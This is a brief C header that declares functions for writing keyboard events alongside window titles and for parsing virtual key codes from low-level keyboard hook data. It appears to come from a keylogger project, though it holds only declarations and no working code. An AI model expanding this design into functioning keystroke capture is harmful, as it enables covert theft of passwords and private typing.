#pragma once

void InitWritter();

void WriteKeyboardEvent(TCHAR *lastTitle, TCHAR *title, PKBDLLHOOKSTRUCT keyEvent);
void ParseVirtualKeyCode(char *buffer, PKBDLLHOOKSTRUCT keyEvent);
